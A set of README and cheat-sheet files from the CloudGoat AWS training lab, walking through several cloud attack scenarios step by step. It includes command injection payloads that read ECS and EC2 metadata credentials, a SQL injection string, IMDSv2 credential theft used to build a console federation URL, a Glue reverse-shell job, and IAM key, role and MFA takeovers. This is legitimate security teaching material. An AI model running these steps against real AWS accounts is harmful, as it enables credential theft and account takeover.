{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/ecs_takeover/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ecs_takeover/cheat_sheet.md", "content": "1. Find the command injection vulnerability in the website. The following payload could contain any bash command, it's just a POC. There is only one input field in the application, so it should be straightforward to determine where this payload goes. \n\n    ```bash\n    ; echo 'hello world'\n    ```\n\n2. Using command injection list all of the containers on the host. You should see containers with name containing \"vulnsite\" and \"privd\". \nvulnsite is hosting the webapp that you just exploited, and privd is sleeping for a year (literally), but runs as a role that will be\nrelevant to us later.\n    \n    ```bash\n   ; docker ps\n   ```\n\n   The ID for the privd container the will be the first field in the output from the following command.\n    \n    ```bash\n   ; docker ps | grep privd\n   ```\n\n3. Using command injection get the container credentials for the privd container as well as the host ECS instance. If you've not seen the endpoints\nlisted below, they are very common targets. \n\n   ```bash\n   ; docker exec <privd container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'\n   ; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/'\n   ; docker exec <privd container id> sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/<your-specific-ecs-agent>'\n   ```\n   \nYou can learn more about ECS Task roles here: \nhttps://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-iam-roles.html  \nAnd ec2 metadata here: \nhttps://docs.aws.amazon.com/AWSEC2/latest/WindowsGuide/instancedata-data-retrieval.html\n\n4. With the escalated credentials from the privd container, list the clusters in the account then enumerate the tasks.\n\n   ```bash\n   aws --profile <container_credentials> ecs list-clusters\n   aws --profile <container_credentials> ecs list-tasks --cluster <your_cluster_name> --query taskArns --out text\n   ```\n   After listing all of the tasks, you can use the following commands to iterate over them and get some more information.\n   \n   ```bash\n   # the following command will describe the target task which will include the name of the corresponding service:\n   aws --profile <container_credentials> ecs describe-tasks --cluster <your_cluster_name> --tasks <target_task>\n   # this command will reveal if the service is scheduled as a replica or daemon.\n   aws --profile <container_credentials> ecs describe-services --cluster <your_cluster_name> --services <target_service>\n   ```\n   \n5. This next step is the crux of the whole operation. In the previous step you will have listed out all of the tasks and their corresponding ecs instances (which are the ec2 instances that tasks, and therefore docker containers, are running on). You'll also know how each service is scheduled. We see that on a second ecs instance there is a task that we have previously did not have access to. Because that task is scheduled as a replica, ecs will attempt to rechedule it on an available ecs instance if it's current host instance goes down for some reason. We can deliberately take that instance down using the credentials we got from the host earlier, forcing it to be rescheduled onto an instance that we have more control over.\n\n   ```bash\n   aws --profile <host_credentials> ecs update-container-instances-state --cluster <your_cluster_name> --container-instances <target_container_instance> --status DRAINING\n   ```\n\n6. Wait for \"Vault\" container to be rescheduled, this can be checked by running docker via command injection.\n    \n    ```bash\n    ; docker ps | grep vault\n    ```\n\n7. Using the command injection on the website get the flag from the \"vault\" container.\n\n    ```bash\n    ; docker exec <vault container id> ls\n    ; docker exec <vault container id> cat FLAG.TXT\n    ```\n\nIf you want more information about REPLICA/DAEMON scheduling read here: https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ecs_services.html\nIf you want information on on what DRAINING means, or ecs instances in general, read here: https://docs.aws.amazon.com/AmazonECS/latest/developerguide/ECS_instances.html\n", "timestamp": "2025-10-24T11:39:42.093761"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/federated_console_takeover/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/federated_console_takeover/README.md", "content": "# Scenario: federated_console_takeover\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `./cloudgoat.py create federated_console_takeover`\n\n## Scenario Resources\n\n- 1 IAM User with limited permissions\n- 1 EC2 instance with IMDSv2 enabled\n- 1 IAM role with elevated permissions\n- 1 VPC with public subnet\n\n## Scenario Start(s)\n\n1. AWS Access Key and Secret Key for a low-privileged IAM user\n\n## Scenario Goal(s)\n\nPivot from limited CLI access to AWS Management Console with elevated permissions\n\n## Summary\n\nIn this scenario, you are given AWS CLI credentials for a low-privileged IAM user. Your task is to enumerate AWS resources, gain access to an EC2 instance via SSM Session Manager, exploit the IMDSv2 metadata service to retrieve temporary credentials, and use those credentials to generate a federation URL that allows you to access the AWS Management Console with elevated permissions.\n\n## Exploitation Route\n\n![federated_console_takeover](FlowChart.png)\n\n## Attack Path Diagram\n\n1. Configure AWS CLI with provided credentials\n2. Enumerate EC2 instances and IAM roles\n3. Access EC2 instance via SSM Session Manager\n4. Exploit IMDSv2 to retrieve temporary credentials\n5. Generate federation URL for console access\n\n## Walkthrough - Federated Console Takeover\n\nA detailed cheat sheet & walkthrough for this scenario is available [here](./cheat_sheet.md).\n\n## Learning Objectives\n\n- AWS CLI enumeration techniques\n- EC2 instance metadata service (IMDSv2) exploitation\n- AWS STS federation URL generation\n- Privilege escalation via IAM role assumption\n- Map techniques to MITRE ATT&CK (e.g., T1078.004, T1580, T1552.005)\n\n## Cloud Security Topics Covered\n\n- IAM permission boundaries and least privilege\n- EC2 metadata service security\n- AWS credential management and security\n- Federation and temporary credential usage\n\n## Real-World Relevance\n\nThis attack path mirrors techniques used in actual AWS breaches where attackers pivot from limited access to full console access by exploiting EC2 instance roles. Organizations should implement proper IAM configurations, enforce IMDSv2, and monitor for suspicious federation access to prevent such attacks.\n\nGaining AWS Console access is extremely useful for attackers. It allows them to blend in with legitimate user activity, evade detections designed for scripted CLI/API behavior, and interact with services more easily through the visual interface. While actions are still logged in CloudTrail, console access offers greater stealth, convenience, and visibility making post-exploitation far more effective. Additionally, certain capabilities like launching CloudShell or creating root account access keys are only possible through the console, further increasing its value to an attacker.\n\n##  Mitigations for federated console takeover via IMDSv2\n\n- Enforce IMDSv2 with hop limit = 1\n  - Blocks indirect metadata access via SSRF or shell-based exploits. Be sure to review your environment before implementing, as this may affect ECS tasks, containerized apps, or agents that access IMDS indirectly.\n\n- Limit EC2 instance role permissions\n  - Apply least privilege avoid broad roles like AdministratorAccess.\n\n- Restrict SSM access\n  - Only allow ssm:StartSession to trusted users or roles.\n\n- Monitor for credential exfiltration\n  - Use GuardDuty and CloudTrail to detect unusual IMDS or federation activity.\n\n- Disable sts:GetFederationToken unless needed\n  - Prevents abuse for console access via temporary credentials.\n\n- Use SCPs or permission boundaries\n  - Contain lateral movement and privilege escalation across environments.", "timestamp": "2025-10-24T11:39:43.153008"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/federated_console_takeover/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/federated_console_takeover/cheat_sheet.md", "content": "## Cheat Sheet - federated_console_takeover\n---\n\n### Step 1: Initial Access and Enumeration\n\n---\n\n1. First, configure your AWS CLI with the provided credentials:\n\n```bash\n# Enter the provided Access Key, Secret Key, and region (us-east-1)\naws configure --profile\n```\n\n2. Verify your identity:\n\n```bash\n# Verifying your profile key\naws sts get-caller-identity --profile\n```\n\n3. Enumerate EC2 instances to locate potential public targets:\n\n```bash\naws ec2 describe-instances --profile\n```\n\n4. Identify IAM instance profiles attached to EC2 instances:\n\n```bash\naws ec2 describe-instances --query \"Reservations[].Instances[].IamInstanceProfile.Arn\" --profile\n```\n\n5. List available IAM roles to identify potential high-privilege roles:\n\n```bash\n# List all roles\naws iam list-roles\n\n# Query only roles that contain the profile instance\naws iam list-roles --query \"Roles[?contains(RoleName, 'cg-ec2-admin')].[RoleName]\" --profile\n```\n\n### Step 2: EC2 Access via SSM Session Manager\n\n---\n\n1. Install SSM Session Manager Plugin on your local. This step is required to access the EC2 through SSM Session Manager:\n\n```bash\n# Debian install\ncurl \"https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb\" -o \"session-manager-plugin.deb\"\n\n# Install Command\nsudo dpkg -i session-manager-plugin.deb\n```\n\n### Step 3: IMDSv2 Exploitation\n\n---\n\n1. Access the EC2 instance using SSM Session Manager:\n\n```bash\naws ssm start-session --target i-<instance_id> --profile\n```\n\n2. Identity User (You should be logged in as ssm-user):\n\n```bash\n# Identify user\nwhoami\n```\n\n3. Switch to root user:\n\n```bash\n# Switch user\nsudo -i\n\n# Identify user\nwhoami\n```\n\n4. Generate an IMDSv2 token: You can perform this step to do further CLI enumeration with elevated privileges otherwise you can skip to Step 4 to generate management console URL.\n\n```bash\nTOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n```\n\n5. Use the token to retrieve the IAM role name:\n\n```bash\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n\n6. Retrieve the temporary credentials for the IAM role:\n\n```bash\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>\n```\n\n7. Configure the AWS CLI with the retrieved temporary credentials:\n\n```bash\n# Configure a new AWS CLI profile using the temporary credentials\naws configure --profile\n\n# Add the session token manually (AWS CLI v2 does not prompt for it)\naws configure set aws_session_token <Token from the metadata output> --profile\n```\n\n8. Verify your identity:\n\n```bash\n# Verifying your profile key\naws sts get-caller-identity --profile\n```\n\n### Step 4: Federation URL Generation\n\n---\n\n1. Request a metadata token for IMDSv2 (required to access EC2 instance metadata securely):\n\n```bash\nTOKEN=$(curl -sX PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\n```\n\n2. Retrieve the IAM role name attached to the EC2 instance using the metadata token:\n\n```bash\nROLE_NAME=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/)\n```\n\n3. Retrieve temporary security credentials for the IAM role:\n\n```bash\nCREDS=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)\n```\n\n4. Build the session JSON object required for AWS federation login:\n\n```bash\nSESSION_JSON=$(jq -n \\\n--arg sid \"$(echo \"$CREDS\" | jq -r '.AccessKeyId')\" \\\n--arg skey \"$(echo \"$CREDS\" | jq -r '.SecretAccessKey')\" \\\n--arg stoken \"$(echo \"$CREDS\" | jq -r '.Token')\" \\\n'{sessionId: $sid, sessionKey: $skey, sessionToken: $stoken}')\n```\n\n5. URL-encode the temporary session JSON for use in the federation URL:\n\n```bash\nSESSION_URL_ENCODED=$(python3 -c \"import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read()))\" <<< \"$SESSION_JSON\")\n```\n\n6. Request a SignIn token using the encoded session:\n\n```bash\nSIGNIN_TOKEN=$(curl -s \"https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=$SESSION_URL_ENCODED\" | jq -r '.SigninToken')\n```\n\n7. Generate the AWS Management Console login URL using the SignIn token:\n\n```bash\nLOGIN_URL=\"https://signin.aws.amazon.com/federation?Action=login&Issuer=cli-script&Destination=https://console.aws.amazon.com/&SigninToken=$SIGNIN_TOKEN\"\n```\n\n8. Echo Sign in URL\n\n```bash\necho \"$LOGIN_URL\"\n```", "timestamp": "2025-10-24T11:39:43.434903"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/glue_privesc/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/glue_privesc/README.md", "content": "# Scenario : Glue_privesc\n\n**Size:** Large\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create glue_privesc`\n\n## Scenario Resources\n\n- 1 VPC with:\n    - S3  x 1\n    - RDS x1\n    - EC2 x1\n    - Glue service\n- Lambda x1\n- SSM parameter Store\n- IAM Users x 2\n\n## Scenario Start(s)\n\nWeb address\n\n## Scenario Goal(s)\n\nFind a secret string stored in the ssm parameter store\n\n## Summary\n\nThere is an environment that is implemented as shown in the schematic drawing below. Glue service manager will accidentally upload their access keys through the web page. The manager hurriedly deleted the key from s3, but does not recognize that the key was stored in the DB.\n\nFind the manager's key and access the ssm parameter store with a vulnerable permission to find the parameter value named ‚Äúflag‚Äù.\n\n> *Note*: The web page and the glue ETL job used in this scenario require some latency. The web page requires 1 minute after applying, and Glue requires 3 minutes after uploading the file. If the data file is not applied properly, please wait a little longer!\n\n\n\n## Schematic drawing\n\n![Schematic drawing](assets/schematic.png)\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](assets/exploitation_route.png)\n\n## Route Walkthrough\n\n‚Äª The attacker identifies the web page functionality first. When you upload a file, it is stored in a specific s3, and you can see that the data in that file is applied to the monitoring page.\n\n1. The attacker steals the Glue manager's access key and secret key through a SQL Injection attack on the web page.\n2. The attacker checks the policies and permissions of the exposed account to identify any vulnerable privileges. Through these privileges, the attacker discovers the ability to create and execute a job that can perform a reverse shell attack, enabling them to obtain the desired role simultaneously.\n3. List the roles to use \"iam:passrole,\" write the reverse shell code, and insert this code file (.py) into S3 through the web page.\n4. In order to gain SSM access, Perform the creation of a Glue service job via AWS CLI, which also executes the reverse shell code.\n5. Execute the created job.\n6. Extract the value of ‚Äúflag‚Äù(parameter name) from the ssm parameter store.\n\n**A cheat sheet for this route is available [here](./cheat_sheet.md)**\n", "timestamp": "2025-10-24T11:39:44.016834"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/glue_privesc/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/glue_privesc/cheat_sheet.md", "content": "1. Sql Injection attack using burp suite\n\n`' 1=1-- -`\n\n2. Check glue administrator information\n\n`aws configure --profile [glue_manager]`\n\n3. Username Verification\n\n`aws --profile [glue_manager] sts get-caller-identity`\n\n4. Check inline policies\n\n`aws --profile [glue_manager] iam list-user-policies --user-name [glue_username]`\n\n5. Read more about inline policies\n\n`aws --profile [glue_manager] iam get-user-policy --user-name [glue_username] --policy-name [inline_policy_name]`\n\n6. Check the bucket granted to the privilege\n\n`aws --profile [glue_manager] s3 ls s3://[bucket_name]`\n\n7. Listing roles for using iam:passrole\n\n`aws --profile [glue_manager] iam list-roles`\n\n8. Inquiry permissions for roles\n\n`aws --profile [glue_manager] iam list-attached-role-policies --role-name [role_name]`\n\n9. Uploading reverse shell code(rev.py) created on the webpage\n\n10. Create a glue job that executes reverse shell code\n\n`aws --profile [glue_manager] glue create-job --name [job_name] --role [role_arn] --command '{\"Name\":\"pythonshell\", \"PythonVersion\": \"3\", \"ScriptLocation\":\"s3://[bucket_name]/[reverse_shell_code_file]\"}'`\n\n11. Run a job\n\n`aws --profile [glue_manager] glue start-job-run --job-name [job_name]`\n\n12. Accessing SSM parameters\n\n`aws ssm get-parameter --name flag`\n", "timestamp": "2025-10-24T11:39:44.473427"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_attachment/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_attachment/README.md", "content": "# Scenario: iam_privesc_by_attachment\n\n**Size:** Medium\n\n**Difficulty:** Moderate\n\n**Command:** `$ ./cloudgoat.py create iam_privesc_by_attachment`\n\n## Scenario Resources\n\n* 1 VPC with:\n  * EC2 x 1\n* 1 IAM User\n\n## Scenario Start(s)\n\n1. IAM User \"Kerrigan\"\n\n## Scenario Goal(s)\n\nDelete the EC2 instance \"cg-super-critical-security-server.\"\n\n## Summary\n\nStarting with a very limited set of permissions, the attacker is able to leverage the instance-profile-attachment permissions to create a new EC2 instance with significantly greater privileges than their own. With access to this new EC2 instance, the attacker gains full administrative powers within the target account and is able to accomplish the scenario's goal - deleting the cg-super-critical-security-server and paving the way for further nefarious actions.\n\nNote: This scenario may require you to create some AWS resources, and because CloudGoat can only manage resources it creates, you should remove them manually before running `./cloudgoat destroy`.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/17beef30-c547-4d58-912c-9b9250ea6c82/image.png)\n\n## Walkthrough - IAM User \"Kerrigan\"\n\n1. Starting as the IAM user \"Kerrigan,\" the attacker uses their limited privileges to explore the environment.\n2. The attacker first lists EC2 instances, identifying their target - the \"cg-super-critical-security-server\" - but being unable to directly affect the target, the attacker looks for another way...\n3. The attacker decides to enumerate existing instance profiles and roles within the account, identifying an instance profile they can use and a promising-looking role.\n4. With a plan in mind, the attacker prepares for their exploit. First, they swap the full-admin role onto the instance profile.\n5. Next, the attacker creates a new EC2 key pair.\n6. Then, the attacker creates a new EC2 instance with that keypair, meaning they now have shell access to it.\n7. As the final step in the exploit, the attacker then attaches the full-admin-empowered instance profile to the EC2 instance.\n8. By accessing and using the new EC2 instance as a staging platform, the attacker is able to execute AWS CLI commands with full admin privileges granted by the attached profile's role.\n9. The attacker is finally able to terminate the \"cg-super-critical-security-server\" EC2 instance, completing the scenario.\n\nA cheat sheet for this route is available [here](./cheat_sheet_kerrigan.md).", "timestamp": "2025-10-24T11:39:45.282314"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_attachment/cheat_sheet_kerrigan.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_attachment/cheat_sheet_kerrigan.md", "content": "`aws configure --profile Kerrigan`\n\n`aws ec2 describe-instances --profile Kerrigan`\n\n`aws iam list-instance-profiles --profile Kerrigan`\n\n`aws iam list-roles --profile Kerrigan`\n\n`aws iam remove-role-from-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> --role-name cg-ec2-meek-role-<cloudgoat_id> --profile Kerrigan`\n\n`aws iam add-role-to-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-<cloudgoat_id> --role-name cg-ec2-mighty-role-<cloudgoat_id> --profile Kerrigan`\n\n`aws ec2 create-key-pair --key-name pwned --profile Kerrigan --query 'KeyMaterial' --output text > pwned.pem`\n\n`chmod 400 pwned.pem`\n\n`aws ec2 describe-subnets --profile Kerrigan`\n\n`aws ec2 describe-security-groups --profile Kerrigan`\n\n`aws ec2 run-instances --image-id ami-0a313d6098716f372 --instance-type t2.micro --iam-instance-profile Arn=<instanceProfileArn> --key-name pwned --profile kerrigan --subnet-id <subnetId> --security-group-ids <securityGroupId>`\n\n`ssh -i pwned.pem ubuntu@<instancePublicDNSName>`\n\n`sudo apt-get update`\n\n`sudo apt-get install awscli`\n\n`aws ec2 describe-instances --region us-east-1`\n\n`aws ec2 terminate-instances --instance-ids <instanceId> --region us-east-1`\n", "timestamp": "2025-10-24T11:39:45.477639"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_ec2/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_ec2/README.md", "content": "# Scenario: iam_privesc_by_ec2\r\n\r\n**Size:** Small\r\n\r\n**Difficulty:** Easy\r\n\r\n**Command:** `$ ./cloudgoat.py create iam_privesc_by_ec2`\r\n\r\n## Scenario Resources\r\n\r\n* 1 EC2 Instance\r\n* 1 IAM User\r\n* 2 IAM Roles\r\n\r\n## Scenario Start(s)\r\n\r\n1. IAM User \"cg_dev_user\"\r\n\r\n## Scenario Goal(s)\r\n\r\nCompromise the EC2 instance \"admin_ec2\" and run privileged commands that can exfiltrate credentials.\r\n\r\n## Summary\r\n\r\nThis is a simple scenario, partially designed to demonstrate the use of [IAMActionHunter](https://github.com/RhinoSecurityLabs/IAMActionHunter) . Starting as the cg_dev_user you need to use your ReadOnly permissions to enumerate the IAM Users and Roles permissions to compromise the \"admin_ec2\" in the account and gain administrator permissions.\r\n\r\n## Walkthrough - IAM User \"cg_dev_user\"\r\n\r\n1. Enumerate IAM permissions for your cg_dev_user and the cg_ec2_management_role\r\n2. Note that you can assume the cg_ec2_management_role role and it has the permissions ec2:stopInstances,ec2:startInstances,ec2:modifyUserAttribute but only resources without a specific tag.\r\n3. cg_dev_user has ec2:deleteTags permission.\r\n4. cg_dev_user deletes the tag from the admin_ec2.\r\n5. cg_dev_user assumes the cg_ec2_management_role and modifies the userdata to run a command to either gain access to it or exfiltrate the credentials from it.\r\n\r\nA cheat sheet for this route is available [here](./cheat_sheet_dev_user.md).\r\n", "timestamp": "2025-10-24T11:39:46.154321"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_ec2/cheat_sheet_dev_user.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_ec2/cheat_sheet_dev_user.md", "content": "### Enumerate the user and roles we have access to from the start cg_dev_user\r\n```\r\n# Gather all roles and users permissions\r\niamactionhunter --collect --profile cg_dev_user\r\n\r\n# Check for Write actions that the dev_user has\r\niamactionhunter --config write_actions --account <account_id> --user cg_dev_user\r\n\r\n# Check if the dev_user has any interesting IAM permissions\r\niamactionhunter --config dangerous_iam --account <account_id> --user cg_dev_user\r\n\r\n# See what write permissions the role you can assume has\r\niamactionhunter --config write_actions --account <account_id> --role cg_ec2_management_role\r\n\r\n# Check back on the dev_user see if you can do anything with tags\r\niamactionhunter --query 'ec2:*tag*' --account <account_id> --user cg_dev_user\r\n\r\n# Note you can delete tags allowing you to satisfy the condition set for the ec2_management_role\r\n```\r\n\r\n### Use the dev_user to enumerate ec2 instances\r\n```\r\n# Get instances that have the tag referenced in the condition\r\naws ec2 describe-instances --region us-west-2 --profile cg_dev_user --filter \"Name=tag:Name,Values=cg_admin_ec2*\" \r\n```\r\n\r\n\r\n\r\n### Delete the tag using the dev_user on the EC2 to satisfy the condition for the cg_ec2_management_role\r\n```\r\naws ec2 delete-tags --region us-west-2 --profile cg_dev_user --resources <instance_id> --tags Key=Name\r\n```\r\n\r\n### Assume the cg_ec2_management_role\r\n```\r\naws sts assume-role --role-arn arn:aws:iam::<account_id>:role/cg_ec2_management_role --role-session-name blah --profile cg_dev_user\r\n```\r\n\r\n### Use the cg_ec2_management_role to stop the instance\r\n```\r\naws ec2 stop-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>\r\n```\r\n\r\n### Use the cg_ec2_management_role to modify the userdata to access the EC2 or exfiltrate credentials from it ([https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/](https://hackingthe.cloud/aws/exploitation/local_ec2_priv_esc_through_user_data/))\r\n```\r\naws ec2 modify-instance-attribute --region us-west-2 --profile cg_ec2_management_role --instance-id <instance_id> --attribute userData --value file://user-data.txt\r\n```\r\n\r\n### Use the cg_ec2_management_role to start the instance\r\n```\r\naws ec2 start-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>\r\n```\r\n\r\n### Access the EC2 or exfiltrate credentials and gain admin privileges\r\nThe EC2 does not have internal or external network access so you will not be able to exfiltrate credentials\r\n", "timestamp": "2025-10-24T11:39:46.401741"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/README.md", "content": "\n# Scenario: iam_privesc_by_key_rotation\n\n**Size:** Small  \n**Difficulty:** Easy\n\n**Command:** `./cloudgoat.py create iam_privesc_by_key_rotation`\n\n## Scenario Resources\n\n- 3 IAM User\n- 1 IAM Role\n- 1 Secret\n\n## Scenario Start(s)\n\n1. IAM User \"manager\"\n\n## Scenario Goal(s)\n\nRetrieve AWS secret\n\n## Summary\n\nExploit insecure IAM permissions to escalate your access. Start with a role that manages other users credentials and find a weakness in the setup to access the \"admin\" role. Using the admin role retrieve the flag from secretsmanager.\n\n## Walkthrough & Exploitation Routes\n\n<details>\n  <summary>Spoiler warning</summary>\n  \n  1. Starting with the manager user add a tag to the admin user\n  2. Delete and add a new access key to the admin user\n  3. Create and attach a MFA device to the admin user\n  4. Switch to the admin user\n  5. Assume the secretsmanager role with MFA\n  6. Retrieve the secret\n\n  A full cheat_sheet can be found [here](./cheat_sheet.md)\n\n  ![Scenario Route(s)](image.jpeg)  \n</details>\n", "timestamp": "2025-10-24T11:39:46.968108"}
{"source": "github", "repo": "RhinoSecurityLabs/cloudgoat", "file": "cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/cheat_sheet.md", "url": "https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/iam_privesc_by_key_rotation/cheat_sheet.md", "content": "# IAM Privecs by Key Rotation Cheat Sheet\n\n`aws configure --profile manager`\n\nEnumerate the credentials\n\n```bash\naws iam list-user-policies --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager\n# SelfManageAccess\n# TagResources\n\naws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name SelfManageAccess --profile manager\n\naws iam get-user-policy --user-name manager_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name TagResources --profile manager\n```\n\nWith the permissions we can tag and change access keys for users with the tag `developer=true`.\n- Looking at the IAM users there is a developer and an admin user.\n- The admin user has permissions to assume a role `cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>` which allows it to retrieve the secret flag.\n\n```bash\naws iam tag-user --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --tags '{\"Key\":\"developer\",\"Value\":\"true\"}' --profile manager\n\naws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager\n\naws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --access-key-id <ACCESS_KEY_ID> --profile manager\n\naws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --profile manager\n# {\n#     \"AccessKey\": {\n#         \"UserName\": \"admin_iam_privesc_by_key_rotation_<cloudgoat_id>\",\n#         \"AccessKeyId\": \"AKIA....\",\n#         \"Status\": \"Active\",\n#         \"SecretAccessKey\": \"GQg+9Me8LmB+099t6....\",\n#         \"CreateDate\": \"2023-09-04T19:20:02+00:00\"\n#     }\n# }\n```\n\nWith the \"admin\" users credentials we can assume the role it has access to...\n\n```bash\naws configure --profile admin\n\naws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --profile admin\n# Access Denied\n```\n\n...the role can only be assumed when using multi-factor authentication\n\nLets create a new virtual mfa device, back in the manager user shell/profile.\n\n```bash\naws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG --profile manager\n# \"SerialNumber\": \"arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa\"\n```\n\nScan the QR code in the file `QRCode.png`. For the following command put in two consecutive tokens. \n\n```bash\naws iam enable-mfa-device \\\n    --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> \\\n    --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa \\\n    --authentication-code1 <MFA Code #1> \\\n    --authentication-code2 <MFA Code #2> \\\n    --profile manager\n```\n\nNow we can assume the role since were using mfa. Switch back to the shell/profile that has the admin users credentials.\n\n```bash\naws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --profile admin --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code <TOKEN_CODE>\n# {\n#     \"Credentials\": {\n#         \"AccessKeyId\": \"ASIA...\",\n#         \"SecretAccessKey\": \"Mm8ij9L8eV.....\",\n#         \"SessionToken\": \"IQoJb3JpZ2luX2VjE..................\",\n#         \"Expiration\": \"2023-09-04T20:36:44+00:00\"\n#     },\n#     \"AssumedRoleUser\": {\n#         \"AssumedRoleId\": \"AROAZ6IIT5XU5WXMGTWEW:cloudgoat_secret\",\n#         \"Arn\": \"arn:aws:sts::0123456789:assumed-role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>/cloudgoat_secret\"\n#     }\n# }\n```\n\nThen Add the admin credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:\n\n```\n[admin]\naws_access_key_id = ASIA....\naws_secret_access_key = Mm8ij9L8eV....\naws_session_token = IQoJb3JpZ2luX2VjE..................\n```\n\nThen retrieve the secret and secret flag using admin.\n\n```bash\naws secretsmanager list-secrets --profile admin\n\naws secretsmanager get-secret-value --secret-id cg_secret_iam_privesc_by_key_rotation_<cloudgoat_id> --profile admin | grep flag\n# flag{...}\n```\n", "timestamp": "2025-10-24T11:39:47.280213"}
